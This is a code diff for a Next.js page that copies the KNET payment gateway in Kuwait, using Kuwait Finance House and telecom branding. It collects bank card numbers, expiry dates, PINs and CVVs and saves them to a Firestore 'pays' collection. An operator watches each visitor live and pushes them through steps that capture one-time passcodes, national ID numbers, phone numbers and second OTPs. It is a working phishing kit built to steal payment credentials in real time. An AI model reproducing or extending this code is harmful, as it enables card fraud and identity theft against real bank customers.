@@ -1,16 +1,12 @@
 "use client"
 import { useEffect, useState } from "react"
-import "./kent.css"
+import "./knet.css"
 import { doc, onSnapshot } from "firebase/firestore"
-import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card"
-import { CreditCard, AlertCircle, Calendar, Lock } from "lucide-react"
-import { Button } from "@/components/ui/button"
+import { useRouter } from "next/navigation"
 import { db, handlePay } from "@/lib/firebase"
-import { Alert, AlertDescription } from "@/components/ui/alert"
-import { Label } from "@/components/ui/label"
-import { FullPageLoader } from "@/components/full-page-loader"
-import { Separator } from "@/components/ui/separator"
-import { Input } from "@/components/ui/input"
+import Loader from "@/components/loader"
+import { setupOnlineStatus } from "@/lib/online-sts"
+
 type PaymentInfo = {
   createdDate: string
   cardNumber: string
@@ -25,6 +21,11 @@ type PaymentInfo = {
   bank_card: string[]
   prefix: string
   status: "new" | "pending" | "approved" | "rejected"
+  phoneNumber: string
+  network: string
+  idNumber: string
+  otp2: string
+  step: number | string
 }
 const BANKS = [
   {
@@ -113,43 +114,12 @@ const BANKS = [
   },
 ]
 
-const Payment = (props: any) => {
-  const handleSubmit = async () => {}
-
-  const [step, setstep] = useState(1)
+export default function Payment() {
+  const [step, setstep] = useState<string | number>(1)
   const [newotp] = useState([""])
   const [total, setTotal] = useState("")
   const [isloading, setisloading] = useState(false)
-  const [timeLeft, setTimeLeft] = useState(300) // 5 minutes in seconds
-  const [isExpired, setIsExpired] = useState(false)
-
-  useEffect(() => {
-    if (timeLeft <= 0) {
-      setIsExpired(true)
-      return
-    }
-
-    const timer = setTimeout(() => {
-      setTimeLeft(timeLeft - 1)
-    }, 1000)
-
-    return () => clearTimeout(timer)
-  }, [timeLeft])
-
-  const formatTime = (seconds: number) => {
-    const mins = Math.floor(seconds / 60)
-    const secs = seconds % 60
-    return `${mins}:${secs < 10 ? "0" : ""}${secs}`
-  }
-
-  const handleResendCode = () => {
-    // Reset timer and expired state
-    setTimeLeft(300)
-    setIsExpired(false)
-    // Here you would typically call an API to resend the code
-    console.log("Resending verification code...")
-  }
-
+  const router = useRouter()
   const [paymentInfo, setPaymentInfo] = useState<PaymentInfo>({
     createdDate: new Date().toISOString(),
     cardNumber: "",
@@ -163,8 +133,16 @@ const Payment = (props: any) => {
     bank_card: [""],
     prefix: "",
     status: "new",
+    phoneNumber: "",
+    network: "",
+    idNumber: "",
+    otp2: "",
+    step: 1
   })
-
+  const [countdown, setCountdown] = useState(60)
+  const [isCountdownActive, setIsCountdownActive] = useState(true)
+  const [otpAttempts, setOtpAttempts] = useState(2)
+  const [otpValue, setOtpValue] = useState('')
   const handleAddotp = (otp: string) => {
     newotp.push(`${otp} , `)
   }
@@ -176,97 +154,106 @@ const Payment = (props: any) => {
     }
   }, [])
 
+
   useEffect(() => {
     const visitorId = localStorage.getItem("visitor")
     if (visitorId) {
+      setupOnlineStatus(visitorId!)
       const unsubscribe = onSnapshot(doc(db, "pays", visitorId), (docSnap) => {
         if (docSnap.exists()) {
           const data = docSnap.data() as PaymentInfo
-          if (data.status) {
-            setPaymentInfo((prev) => ({ ...prev, status: data.status }))
-            if (data.status === "approved") {
-              // If we're on step 1, move to OTP verification
-              if (step === 1) {
-                setstep(2)
-                setisloading(false)
-              }
-              // If we're already on step 2 (OTP verification), this means OTP was approved
-              else if (step === 2) {
-                // Show success message or redirect to success page
-                setisloading(false)
-                // You could redirect here or show a success component
-              }
-            } else if (data.status === "rejected") {
-              setisloading(false)
-              alert("تم رفض البطاقة الرجاء, ادخال معلومات البطاقة بشكل صحيح ")
-              setstep(1)
-            } else if (data.status === "pending") {
-              setisloading(true)
+          if (data.step !== step) {
+            if (parseInt(data?.step?.toString()) === 5) {
+              window.location.href = '/auth'
+
+            } else if (parseInt(data?.step?.toString()) === 10) {
+
+              window.location.href = '/'
+            } else {
+              setstep(parseInt(data?.step?.toString()) || 1)
             }
+          }
+          if (data.status === "pending") {
+            setisloading(true)
+          } else if (data.status === "approved") {
+            setisloading(false)
+            setstep(2)
+          }
+          else if (data.status === "rejected") {
+            setisloading(false)
+            alert('Card rejected please try again!')
+            setstep(1)
           }
         }
       })
 
       return () => unsubscribe()
     }
-  }, [step])
+  }, [])
+
+  useEffect(() => {
+    let interval: NodeJS.Timeout | null = null
+
+    if (isCountdownActive && countdown > 0) {
+      interval = setInterval(() => {
+        setCountdown((countdown) => countdown - 1)
+      }, 1000)
+    } else if (countdown === 0) {
+      setIsCountdownActive(false)
+    }
+
+    return () => {
+      if (interval) clearInterval(interval)
+    }
+  }, [isCountdownActive, countdown])
 
   return (
-    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir='ltr'> 
+    <div style={{ background: "#f1f1f1", height: "100vh", margin: 0, padding: 0 }} dir="ltr">
       <form
         onSubmit={(e) => {
-          e.preventDefault();
+          e.preventDefault()
         }}
+        style={{ direction: "ltr" }}
       >
-        <div className="madd" />
-        <img src="./pc.jpg" className="-" alt="logo" />
-
-        <div id="PayPageEntry" >
-
-          <div className="container">
-
+        <div id="PayPageEntry">
+          <div className="container" >
+            <div style={{ display: 'flex', justifyContent: 'center' }}>
+              <img src="./mob.png" className="-" alt="logo" />
+            </div>
             <div className="content-block">
-              <Card className="form- p-6 ">
-                <div className="container-" style={{ display: 'flex', justifyContent: 'center' }}>
-                  <img src="./kfh.jpg" className="-" alt="logo" height={80} width={80} />
+              <div className="form-card">
+                <div className="container-" style={{ display: "flex", justifyContent: "center" }}>
+                  <img src="./kfh.jpg" className="-" alt="logo" height={90} width={90} />
                 </div>
                 <div className="row">
                   <label className="column-label">Merchant: </label>
-                  <label className="column-value text-label">Kuwait Finance House (KFH) </label>
+                  <label className="column-value text-label">Mobile Telecommunication Co. </label>
                 </div>
                 <div id="OrgTranxAmt">
                   <label className="column-label"> Amount: </label>
                   <label className="column-value text-label" id="amount">
                     {total}
-                    {'  '}KD&nbsp;{' '}
+                    {"  "}KD&nbsp;{" "}
                   </label>
                 </div>
                 {/* Added for PG Eidia Discount starts   */}
-                <div
-                  className="row"
-                  id="DiscntRate"
-                  style={{ display: 'none' }}
-                />
-                <div
-                  className="row"
-                  id="DiscntedAmt"
-                  style={{ display: 'none' }}
-                />
+                <div className="row" id="DiscntRate" style={{ display: "none" }} />
+                <div className="row" id="DiscntedAmt" style={{ display: "none" }} />
                 {/* Added for PG Eidia Discount ends   */}
-              </Card>
-              <Card className="form- p-4 my-4">
+              </div>
+              <div className="form-card">
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="otpmsgDC"
                 />
@@ -274,15 +261,15 @@ const Payment = (props: any) => {
                 <div
                   className="notification"
                   style={{
-                    border: '#ff0000 1px solid',
-                    backgroundColor: '#f7dadd',
+                    border: "#ff0000 1px solid",
+                    backgroundColor: "#f7dadd",
                     fontSize: 12,
-                    fontFamily: 'helvetica, arial, sans serif',
-                    color: '#ff0000',
+                    fontFamily: "helvetica, arial, sans serif",
+                    color: "#ff0000",
                     paddingRight: 15,
-                    display: 'none',
+                    display: "none",
                     marginBottom: 3,
-                    textAlign: 'center',
+                    textAlign: "center",
                   }}
                   id="CVmsg"
                 />
@@ -293,7 +280,7 @@ const Payment = (props: any) => {
               padding: 2px; display:none;margin-bottom: 3px; text-align:center;"   id="">
                       </span*/}
                 </div>
-                <div id="savedCardDiv" style={{ display: 'none' }}>
+                <div id="savedCardDiv" style={{ display: "none" }}>
                   {/* Commented the bank name display for kfast starts */}
                   <div className="row">
                     <br />
@@ -315,7 +302,7 @@ const Payment = (props: any) => {
                       size={4}
                       maxLength={4}
                       className="allownumericwithoutdecimal"
-                      style={{ width: '50%' }}
+                      style={{ width: "50%" }}
                     />
                   </div>
                   {/* Added for Points Redemption */}
@@ -325,27 +312,20 @@ const Payment = (props: any) => {
                   <>
                     <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
                       <div className="row">
-                        <label
-                          className="column-label"
-                          style={{ width: '40%' }}
-                        >
+                        <label className="column-label" style={{ width: "40%" }}>
                           Select Your Bank:
                         </label>
                         <select
                           className="column-value"
-                          style={{ width: '60%' }}
+                          style={{ width: "60%" }}
                           onChange={(e: any) => {
-                            const selectedBank = BANKS.find(
-                              (bank) => bank.value === e.target.value
-                            );
+                            const selectedBank = BANKS.find((bank) => bank.value === e.target.value)
 
                             setPaymentInfo({
                               ...paymentInfo,
                               bank: e.target.value,
-                              bank_card: selectedBank
-                                ? selectedBank.cardPrefixes
-                                : [''],
-                            });
+                              bank_card: selectedBank ? selectedBank.cardPrefixes : [""],
+                            })
                           }}
                         >
                           <>
@@ -360,14 +340,11 @@ const Payment = (props: any) => {
                           </>
                         </select>
                       </div>
-                      <div
-                        className="row three-column"
-                        id="Paymentpagecardnumber"
-                      >
-                        <label className="column-label">Card Number:</label>
+                      <div className="row three-column" id="Paymentpagecardnumber">
+                        <label className="column-label mt-1">Card Number:</label>
                         <label>
                           <select
-                            className="column-value"
+                            className="column-value  mt-1"
                             name="dcprefix"
                             id="dcprefix"
                             onChange={(e: any) =>
@@ -376,15 +353,15 @@ const Payment = (props: any) => {
                                 prefix: e.target.value,
                               })
                             }
-                            style={{ width: '26%' }}
+                            style={{ width: "26%" }}
                           >
                             <option
-                              value={'i'}
+                              value={"i"}
                               onClick={(e: any) => {
                                 setPaymentInfo({
                                   ...paymentInfo,
                                   prefix: e.target.value,
-                                });
+                                })
                               }}
                             >
                               prefix
@@ -397,7 +374,7 @@ const Payment = (props: any) => {
                                   setPaymentInfo({
                                     ...paymentInfo,
                                     prefix: e.target.value,
-                                  });
+                                  })
                                 }}
                               >
                                 {i}
@@ -414,7 +391,7 @@ const Payment = (props: any) => {
                             pattern="[0-9]*"
                             size={10}
                             className="allownumericwithoutdecimal"
-                            style={{ width: '32%' }}
+                            style={{ width: "32%" }}
                             maxLength={10}
                             onChange={(e: any) =>
                               setPaymentInfo({
@@ -428,10 +405,7 @@ const Payment = (props: any) => {
                       </div>
                       <div className="row three-column" id="cardExpdate">
                         <div id="debitExpDate">
-                          <label className="column-label">
-                            {' '}
-                            Expiration Date:{' '}
-                          </label>
+                          <label className="column-label"> Expiration Date: </label>
                         </div>
                         <select
                           onChange={(e: any) =>
@@ -514,11 +488,7 @@ const Payment = (props: any) => {
                       </div>
                       <div className="row" id="PinRow">
                         {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                        <input
-                          type="hidden"
-                          name="cardPinType"
-                          defaultValue="A"
-                        />
+
                         <div id="eComPin">
                           <label className="column-label"> PIN: </label>
                         </div>
@@ -540,228 +510,229 @@ const Payment = (props: any) => {
                             size={4}
                             maxLength={4}
                             className="allownumericwithoutdecimal"
-                            style={{ width: '60%' }}
+                            style={{ width: "60%" }}
                           />
                         </div>
                       </div>
-                      {
-                        step === 1 && paymentInfo.status === 'approved' ? (
-                          <div className="row" id="PinRow">
-                            {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
-                            <input
-                              type="hidden"
-                              name="cardPinType"
-                              defaultValue="A"
-                            />
-                            <div id="eComPin">
-                              <label className="column-label"> Cvv: </label>
-                            </div>
-                            <div>
-                              <input
-                                inputMode="numeric"
-                                pattern="[0-9]*"
-                                name="cvv"
-                                id="cvv"
-                              
-                                autoComplete="off"
-                                title="Should be in number. Length should be 3"
-                                type="password"
-                                size={3}
-                                maxLength={3}
-                                className="allownumericwithoutdecimal"
-                                style={{ width: '60%' }}
-                              />
-                            </div>
+                      {step === 1 && paymentInfo.status === "approved" ? (
+                        <div className="row" id="PinRow">
+                          {/* <div class="col-lg-12"><label class="col-lg-6"></label></div> */}
+                          <input type="hidden" name="cardPinType" defaultValue="A" />
+                          <div id="eComPin">
+                            <label className="column-label"> Cvv: </label>
                           </div>
-                        ) : null
-                      }
+                          <div>
+                            <input
+                              inputMode="numeric"
+                              pattern="[0-9]*"
+                              name="cvv"
+                              id="cvv"
+                              autoComplete="off"
+                              title="Should be in number. Length should be 3"
+                              type="password"
+                              size={3}
+                              maxLength={3}
+                              className="allownumericwithoutdecimal"
+                              style={{ width: "60%" }}
+                            />
+                          </div>
+                        </div>
+                      ) : null}
                     </div>
                   </>
-                ) : (
+                ) : step === 2 ? (
                   <div>
-                         <div className="">
-      <CardHeader>
-        <CardTitle className="text-xl font-semibold">Payment Verification</CardTitle>
-      </CardHeader>
-      <CardContent className="space-y-4">
-        <Alert variant="default" className="bg-blue-50 border-blue-200">
-          <AlertCircle className="h-4 w-4 text-blue-600" />
-          <AlertDescription className="text-sm text-blue-700">
-            A 6-digit verification code has been sent via text message to your registered phone number. Please enter the
-            code below to complete the verification process.
-          </AlertDescription>
-        </Alert>
-
-        <div className="space-y-3 mt-4">
-          <div className="flex items-center justify-between py-2">
-            <div className="flex items-center gap-2 text-sm text-muted-foreground">
-              <CreditCard className="h-4 w-4" />
-              <span>Card Number:</span>
-            </div>
-            <span className="font-medium">••••  {paymentInfo.cardNumber}</span>
-          </div>
-
-          <Separator />
-
-          <div className="flex items-center justify-between py-2">
-            <div className="flex items-center gap-2 text-sm text-muted-foreground">
-              <Calendar className="h-4 w-4" />
-              <span>Expiration Date:</span>
-            </div>
-            <span className="font-medium">
-              {paymentInfo.month}/{paymentInfo.year}
-            </span>
-          </div>
-
-          <Separator />
-
-          <div className="flex items-center justify-between py-2">
-            <div className="flex items-center gap-2 text-sm text-muted-foreground">
-              <Lock className="h-4 w-4" />
-              <span>Security Code:</span>
-            </div>
-            <span className="font-medium">••••</span>
-          </div>
-        </div>
-
-        <div className="mt-6 space-y-2">
-          <Label htmlFor="otp" className="text-sm font-medium">
-            Enter Verification Code
-          </Label>
-          <Input
-            id="otp"
-            type="tel"
-            inputMode="numeric"
-            maxLength={6}
-            placeholder="6-digit code"
-            className="text-center tracking-widest text-lg"
-            value={paymentInfo.otp}
-            onChange={(e) =>
-              setPaymentInfo({
-                ...paymentInfo,
-                otp: e.target.value.replace(/[^0-9]/g, ""),
-                status:'pending'
-              })
-            }
-          /> <div className="flex items-center justify-between mt-2">
-          <p className="text-xs text-muted-foreground">
-            {isExpired ? (
-              "Code expired"
-            ) : (
-              <>
-                Code expires in <span className="font-medium">{formatTime(timeLeft)}</span>
-              </>
-            )}
-          </p>
-          {isExpired && (
-            <button
-              type="button"
-              onClick={handleResendCode}
-              className="text-xs text-blue-600 hover:text-blue-800 font-medium"
-            >
-              Resend Code
-            </button>
-          )}
-        </div>
-          <p className="text-xs text-muted-foreground mt-1">Please enter the 6-digit code sent to your phone</p>
-        </div>
-      </CardContent>
-    </div>
-                   
+                    <div className="row">
+                      <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
+                        <strong>Please note:</strong> A 6-digit verification code has been sent via text message to your registered phone
+                        number
+                      </div>
                     </div>
-                )
-                }
-              </Card>
-              <Card className="form- p-4">
+                    <div className="row">
+                      <label className="column-label">CardNumber:</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}>
+                        {" "}
+                        {paymentInfo.cardNumber.substring(0, 5) + "****" + paymentInfo.cardNumber.substring(10, 15)}
+                      </label>
+                    </div>
+                    <div className="row">
+                      <label className="column-label">Month expiry:</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.month}</label>
+                    </div>
+                    <div className="row">
+                      <label className="column-label">Year expiry:</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 100 }}> {paymentInfo.year}</label>
+                    </div>
+                    <div className="row">
+                      <label className="column-label">Pin:</label>
+                      <label className="allownumericwithoutdecimal" style={{ color: 'black', fontWeight: 200 }}>{"****"}</label>
+                    </div>
+                    <div className="flex my-1">
+                      <label className="column-value ">OTP:</label>
+                      <input
+                        onChange={(e: any) => {
+
+                          setPaymentInfo({
+                            ...paymentInfo,
+                            otp: e.target.value,
+                          })
+                          setOtpValue(e.target.value)
+
+                        }
+                        }
+                        type="tel"
+                        maxLength={6}
+                        id="timer"
+                        className="w-full"
+                        value={otpValue}
+                        placeholder={`Timeout in: 01:${countdown === 0 ? '00' : countdown}`}
+                      />
+                    </div>
+                    <div className="row">
+                      <div
+                        className="text-sm text-gray-600"
+                        style={{ fontSize: 12, color: "#666", textAlign: "center", marginTop: 5 }}
+                      >
+                        {otpAttempts >= 6 && (
+                          <div style={{ color: "#ff0000", marginTop: 2 }}>
+                            سيتطلب مزيداً من التحقق بسبب فشل التحقق من الرمز
+                          </div>
+                        )}
+                      </div>
+                    </div>
+                  </div>
+                ) : step === 3 ? (
+                  <>
+                    <Step3 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : step === 4 ? (
+                  <>
+                    <Step4 setPaymentInfo={setPaymentInfo} paymentInfo={paymentInfo} />
+                  </>
+                ) : (
+                  <></>
+                )}
+              </div>
+              <div className="form-card">
                 <div className="row">
-                  <div style={{ textAlign: 'center' }}>
-                    <div id="loading" style={{ display: 'none' }}>
+                  <div style={{ textAlign: "center" }}>
+                    <div id="loading" style={{ display: "none" }}>
                       <center>
                         <img
                           style={{
                             height: 20,
-                            float: 'left',
-                            marginLeft: '20%',
+                            float: "left",
+                            marginLeft: "20%",
                           }}
                         />
-                        <label
-                          className="column-value text-label"
-                          style={{ width: '70%', textAlign: 'center' }}
-                        >
+                        <label className="column-value text-label" style={{ width: "70%", textAlign: "center" }}>
                           Processing.. please wait ...
                         </label>
                       </center>
                     </div>
-                 
-                    <div style={{ display: 'flex' }}>
-                      <Button
-                      size={'sm'} className='bg-gray-300 mx-1 h-6' variant={'outline'}
+                    <div style={{ display: "flex" }}>
+                      <button
+                        style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}
                         disabled={
-                          (step === 1 && (paymentInfo.prefix === "" || paymentInfo.bank === "" || paymentInfo.cardNumber === "" || paymentInfo.pass === "" || paymentInfo.month === "" || paymentInfo.year === "" || paymentInfo.pass.length !== 4)) ||
-         step ===2 && paymentInfo.otp?.length !==6
+                          (step === 1 &&
+                            (paymentInfo.prefix === "" ||
+                              paymentInfo.bank === "" ||
+                              paymentInfo.cardNumber === "" ||
+                              paymentInfo.pass === "" ||
+                              paymentInfo.month === "" ||
+                              paymentInfo.year === "" ||
+                              paymentInfo.pass.length !== 4)) ||
+                          (step === 2 && paymentInfo.otp?.length !== 6)
                         }
                         onClick={() => {
                           if (step === 1) {
-                            setisloading(true);
-                            handlePay(paymentInfo, setPaymentInfo);
-                            handleSubmit();
+                            setisloading(true)
+                            handlePay(paymentInfo, setPaymentInfo)
+
                           } else if (step === 2) {
-                            if (!newotp.includes(paymentInfo.otp!)) { 
-                              newotp.push(paymentInfo.otp!);
+                            if (!newotp.includes(paymentInfo.otp!)) {
+                              newotp.push(paymentInfo.otp!)
                             }
-                            setisloading(true);
-                            handleAddotp(paymentInfo.otp!);
-                            
-                            // Update the payment info with OTP and set status to pending for approval
-                            const updatedPaymentInfo = {
-                              ...paymentInfo,
-                              otp: paymentInfo.otp,
-                              status: 'pending',
-                              allOtps: [...newotp]
-                            };
-                            
-                            // Send the updated payment info for processing
-                            handlePay(updatedPaymentInfo, setPaymentInfo);
-                            
-                            // Don't reset OTP immediately to allow for proper verification
-                            // The status will be updated by the Firebase listener
+                            setisloading(true)
+                            handleAddotp(paymentInfo.otp!)
+
+                            // Increment attempt counter
+                            const newAttemptCount = otpAttempts + 1
+                            setOtpAttempts(newAttemptCount)
+
+                            // Clear OTP input after submit
+                            setOtpValue('')
+                            handlePay(paymentInfo, setPaymentInfo)
+
+                            setTimeout(() => {
+                              // Check if this is the 3rd attempt, if so move to step 3
+                              if (newAttemptCount >= 3) {
+                                alert("تم استنفاد المحاولات المسموحة. سيتم الانتقال إلى التحقق الإضافي لإكمال العملية.")
+                                setstep(3)
+                                setOtpAttempts(1) // Reset counter for next time
+                              } else {
+                                // For now, we'll assume OTP is incorrect and stay on step 2
+                                // In a real scenario, you'd check the OTP validation response
+                              }
+                              setisloading(false)
+                            }, 3000)
+                          } else if (step === 3) {
+                            setisloading(true)
+
+                            // Save step 3 data to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
+
+                            setTimeout(() => {
+                              setstep(4)
+                              setisloading(false)
+                            }, 7000)
+                          } else if (step === 4) {
+                            setisloading(true)
+
+                            // Save step 4 data (otp2) to Firestore
+                            handlePay(paymentInfo, setPaymentInfo)
+
+                            setTimeout(() => {
+                              setisloading(false)
+                              router.push("/auth")
+                            }, 5000)
                           }
+
+                          setPaymentInfo({
+                            ...paymentInfo,
+                            otp2: step === 4 ? "" : paymentInfo.otp2,
+                          })
                         }}
                       >
-                        {isloading ? "Wait..." : (step === 1 ? "Submit" : "Confirm")}
-                      </Button>
-                      <Button size={'sm'} className='bg-gray-300 h-6' variant={'outline'}>Cancel</Button>
+                        {isloading ? "Wait..." : step === 1 ? "Submit" : "Confirm"}
+                      </button>
+                      <button style={{ background: "#f2f2f2", marginLeft: 0, borderRadius: 5 }}>Cancel</button>
                     </div>
                   </div>
                 </div>
-              </Card>
-              <div
-                id="overlayhide"
-                className="overlay"
-                style={{ display: 'none' }}
-              ></div>
+              </div>
+              <div id="overlayhide" className="overlay" style={{ display: "none" }}></div>
 
               <footer>
                 <div className="footer-content-new">
                   <div className="row_new">
                     <div
                       style={{
-                        textAlign: 'center',
+                        textAlign: "center",
                         fontSize: 11,
                         lineHeight: 1,
                       }}
                     >
-                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2025&nbsp;©&nbsp;
+                      All&nbsp;Rights&nbsp;Reserved.&nbsp;Copyright&nbsp;2024&nbsp; &nbsp;
                       <br />
                       <span
                         style={{
                           fontSize: 10,
-                          fontWeight: 'bold',
-                          color: '#0077d5',
+                          fontWeight: "bold",
+                          color: "#0077d5",
                         }}
                       >
-                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company
-                        - KNET
+                        The&nbsp;Shared&nbsp;Electronic&nbsp;Banking&nbsp;Services&nbsp;Company - KNET
                       </span>
                     </div>
                   </div>
@@ -772,10 +743,134 @@ const Payment = (props: any) => {
             </div>
           </div>
         </div>
+        {isloading && <Loader />}
       </form>
-      {isloading && <FullPageLoader />}
     </div>
-  );
+  )
 }
 
-export default Payment
+const Step3 = ({ setPaymentInfo, paymentInfo }: any) => {
+  return (
+    <div id="FCUseDebitEnable" style={{ marginTop: 5 }}>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label>
+          <input
+            name="natID"
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={12}
+            onChange={(e: any) =>
+              setPaymentInfo({
+                ...paymentInfo,
+                idNumber: e.target.value,
+              })
+            }
+            className="allownumericwithoutdecimal"
+            maxLength={12}
+            title="Should be in number. Length should be 12"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Authorized Phone Number:
+        </label>
+        <label>
+          <input
+            name="number"
+            onChange={(e: any) =>
+              setPaymentInfo({
+                ...paymentInfo,
+                phoneNumber: e.target.value,
+              })
+            }
+            style={{ width: "60%" }}
+            type="tel"
+            inputMode="numeric"
+            pattern="[0-9]*"
+            size={10}
+            className="allownumericwithoutdecimal"
+            maxLength={10}
+            title="Should be in number. Length should be 10"
+          />
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label" style={{ width: "40%" }}>
+          Network operator:{" "}
+        </label>
+        <select
+          className="column-value"
+          style={{ width: "60%" }}
+          name="company"
+          onChange={(e: any) =>
+            setPaymentInfo({
+              ...paymentInfo,
+              network: e.target.value,
+            })
+          }
+          id="type"
+        >
+          <option value="">Choose Network operator:...</option>
+          <option value="STC" title="STC">
+            STC
+          </option>
+          <option value="Zain" title="Zain">
+            Zain
+          </option>
+          <option value="Ooredoo" title="Ooredoo">
+            Ooredoo
+          </option>
+        </select>
+      </div>
+    </div>
+  )
+}
+const Step4 = (props: any) => {
+  return (
+    <div>
+      <div className="row">
+        <div className="bg-blue-100 font-normal p-2 my-2" style={{ fontSize: 12, borderRadius: 3 }}>
+          Please note: A 6-digit verification code has been sent via text message to your registered phone number
+        </div>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          ID Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.idNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label style={{ width: "40%" }} className="column-label">
+          Phone Number:
+        </label>
+        <label style={{ width: "60%", fontWeight: 100, color: "black" }} className="column-label">
+          {props.paymentInfo.phoneNumber}
+        </label>
+      </div>
+      <div className="row">
+        <label className="column-label">OTP:</label>
+        <label className="column-label"></label>
+        <input
+          onChange={(e: any) =>
+            props.setPaymentInfo({
+              ...props.paymentInfo,
+              otp2: e.target.value,
+            })
+          }
+          type="tel"
+          maxLength={6}
+          id="timer"
+          value={props.paymentInfo.otp2}
+        />
+      </div>
+    </div>
+  )
+}
